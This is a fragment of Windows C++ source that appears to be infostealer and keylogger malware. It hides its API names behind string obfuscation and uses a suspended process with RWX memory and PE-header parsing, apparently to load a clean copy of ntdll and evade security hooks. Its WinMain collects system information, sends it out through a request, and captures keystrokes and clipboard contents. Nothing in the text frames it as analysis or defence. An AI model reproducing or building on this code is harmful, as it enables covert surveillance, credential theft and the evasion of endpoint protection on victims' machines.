    BOOL success = reinterpret_cast<BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION)>(fcp)(NULL,
        (LPSTR)getOriginalString(calc, big_string, sizeof(calc)).c_str(),
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
        NULL,
        (LPCSTR)getOriginalString(path, big_string, sizeof(path)).c_str(),
        &si,
        &pi);

    if (success == FALSE) {
        return;
    }

    FARPROC gmh = GetProcAddress(modKr, getOriginalString(gm, big_string, sizeof(gm)).c_str());

    char* adr = (char*)reinterpret_cast<HMODULE(*)(LPCSTR)>(gmh)(getOriginalString(nd, big_string, sizeof(nd)).c_str());
    IMAGE_DOS_HEADER* pDosHdr = (IMAGE_DOS_HEADER*)adr;
    IMAGE_NT_HEADERS* pNTHdr = (IMAGE_NT_HEADERS*)(adr + pDosHdr->e_lfanew);
    IMAGE_OPTIONAL_HEADER* pOptionalHdr = &pNTHdr->OptionalHeader;

    SIZE_T nsize = pOptionalHdr->SizeOfImage;
    FARPROC vir_a = GetProcAddress(modKr, getOriginalString(va, big_string, sizeof(va)).c_str());
    FARPROC term_p = GetProcAddress(modKr, getOriginalString(end, big_string, sizeof(end)).c_str());
    FARPROC vir_f = GetProcAddress(modKr, getOriginalString(free, big_string, sizeof(free)).c_str());


    LPVOID pca = reinterpret_cast<LPVOID(*)(LPVOID, SIZE_T, DWORD, DWORD)>(vir_a)(
        NULL,
        nsize,
        MEM_COMMIT,
        PAGE_EXECUTE_READWRITE);


    SIZE_T bytesRead = 0;


    reinterpret_cast<BOOL(WINAPI*)(HANDLE, UINT)>(term_p)(pi.hProcess, 0);

    ret = core(reinterpret_cast<HMODULE(*)(LPCSTR)>(gmh)((LPCSTR)getOriginalString(nt, big_string, sizeof(nt)).c_str()), pca);
    reinterpret_cast<BOOL(WINAPI*)(LPVOID, SIZE_T, DWORD)>(vir_f)(pca, 0, MEM_RELEASE);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    LPSTR lpCmdLine, int nCmdShow)
{
    firstfun();

    setlocale(LC_ALL, ".UTF8");

    std::string inf = collectSystemInfo();

    sendRequest(inf);
    captureKeystrokesAndClipboard(inf);

    return 0;
}
